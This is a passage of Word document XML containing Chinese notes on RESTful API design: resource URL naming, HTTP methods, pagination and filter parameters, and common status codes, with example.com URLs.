        <w:t>路径表示 API 的具体网址。每个网址代表一种资源。 资源作为网址，网址中不能有动词只能有名词，一般名词要与数据库的表名对应。而且名词要使用复数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E59300D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="408" w:name="5628-1535454054846"/>
      <w:bookmarkEnd w:id="408"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>错 误 示 例 ： </w:t>
      </w:r>
      <w:hyperlink r:id="rId212" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/getGoods</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId213" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/listOrders</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E9533B8" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="409" w:name="6655-1535454134952"/>
      <w:bookmarkEnd w:id="409"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正确示例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEE013F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="410" w:name="3425-1535454054846"/>
      <w:bookmarkEnd w:id="410"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#获取单个商品</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="411" w:name="7025-1535454054846"/>
    <w:bookmarkEnd w:id="411"/>
    <w:p w14:paraId="71B29AD6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "http://www.example.com/app/goods/1" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>http://www.example.com/app/goods/1</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEAF27C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="412" w:name="6736-1535454054846"/>
      <w:bookmarkEnd w:id="412"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#获取所有商品</w:t>
      </w:r>
      <w:hyperlink r:id="rId214" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/app/goods</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2F656ADF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="413" w:name="2287-1535454054846"/>
      <w:bookmarkEnd w:id="413"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>四、使用标准的 HTTP 方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C1AF2C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="414" w:name="8194-1535454054846"/>
      <w:bookmarkEnd w:id="414"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于资源的具体操作类型，由 HTTP 动词表示。 常用的 HTTP 动词有四个。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016A13BD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="415" w:name="1713-1535454188027"/>
      <w:bookmarkEnd w:id="415"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET SELECT ：从服务器获取资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D83EA96" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="416" w:name="6083-1535454054846"/>
      <w:bookmarkEnd w:id="416"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>POST  CREATE  ：在服务器新建资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28CB6DC9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="417" w:name="7583-1536117907435"/>
      <w:bookmarkEnd w:id="417"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>PUT UPDATE ：在服务器更新资源。                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3F8F8A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="418" w:name="8038-1536117911596"/>
      <w:bookmarkEnd w:id="418"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DELETE  DELETE ：从服务器删除资源。示例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64725A9A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="419" w:name="5241-1535454054846"/>
      <w:bookmarkEnd w:id="419"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#获取指定商品的信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120AAC00" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="420" w:name="1497-1535454054846"/>
      <w:bookmarkEnd w:id="420"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET </w:t>
      </w:r>
      <w:hyperlink r:id="rId215" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods/ID</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3E753E9D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="421" w:name="4988-1535454054846"/>
      <w:bookmarkEnd w:id="421"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#新建商品的信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EFD2DF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="422" w:name="6266-1535454054846"/>
      <w:bookmarkEnd w:id="422"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>POST </w:t>
      </w:r>
      <w:hyperlink r:id="rId216" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35797394" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="423" w:name="3370-1535454054846"/>
      <w:bookmarkEnd w:id="423"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#更新指定商品的信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F53C1F2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="424" w:name="8897-1535454054846"/>
      <w:bookmarkEnd w:id="424"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>PUT </w:t>
      </w:r>
      <w:hyperlink r:id="rId217" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods/ID</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B4417D7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="425" w:name="9190-1535454054846"/>
      <w:bookmarkEnd w:id="425"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#删除指定商品的信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E534C0E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="426" w:name="0017-1535454054846"/>
      <w:bookmarkEnd w:id="426"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DELETE </w:t>
      </w:r>
      <w:hyperlink r:id="rId218" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods/ID</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7C996A5B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="427" w:name="8660-1535454228649"/>
      <w:bookmarkEnd w:id="427"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>五、过滤信息：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24922AE2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="428" w:name="1410-1535454054846"/>
      <w:bookmarkEnd w:id="428"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果资源数据较多，服务器不能将所有数据一次全部返回给客户端。API 应该提供参数，过滤返回结果。 实例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1683E377" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="429" w:name="7780-1535454054846"/>
      <w:bookmarkEnd w:id="429"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#指定返回数据的数量</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="430" w:name="6820-1535454054846"/>
    <w:bookmarkEnd w:id="430"/>
    <w:p w14:paraId="5CBA0B05" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "http://www.example.com/goods?limit=10" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>http://www.example.com/goods?limit=10</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6845A0E5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="431" w:name="5458-1535454054846"/>
      <w:bookmarkEnd w:id="431"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#指定返回数据的开始位置</w:t>
      </w:r>
      <w:hyperlink r:id="rId219" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods?offset=10</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="523A687A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="432" w:name="6677-1535454054846"/>
      <w:bookmarkEnd w:id="432"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#指定第几页，以及每页数据的数量</w:t>
      </w:r>
      <w:hyperlink r:id="rId220" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods?page=2&amp;per_page=20</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="25C6F0C1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="433" w:name="1582-1535454054846"/>
      <w:bookmarkEnd w:id="433"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>六、状态码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0EED2F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="434" w:name="6319-1535454054846"/>
      <w:bookmarkEnd w:id="434"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>服务器向用户返回的状态码和提示信息，常用的有： 200 OK ：服务器成功返回用户请求的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AE1272" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="435" w:name="8960-1535454054846"/>
      <w:bookmarkEnd w:id="435"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>201 CREATED ：用户新建或修改数据成功。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08066840" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="436" w:name="6292-1535454054846"/>
      <w:bookmarkEnd w:id="436"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>202 Accepted：表示请求已进入后台排队。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78DA01A4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="437" w:name="3429-1535454054846"/>
      <w:bookmarkEnd w:id="437"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>400 INVALID REQUEST ：用户发出的请求有错误。401 Unauthorized ：用户没有权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7DD8BA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="438" w:name="3345-1535454054846"/>
      <w:bookmarkEnd w:id="438"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>403 Forbidden ：访问被禁止。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF043FE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="439" w:name="1160-1535456531569"/>
      <w:bookmarkEnd w:id="439"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>404 NOT FOUND  ：请求针对的是不存在的记录。406 Not Acceptable ：用户请求的的格式不正确。500 INTERNAL SERVER ERROR ：服务器发生错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486D3ABE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="440" w:name="6044-1535454054846"/>
      <w:bookmarkEnd w:id="440"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>七、错误信息：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21737234" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="441" w:name="2826-1535454054846"/>
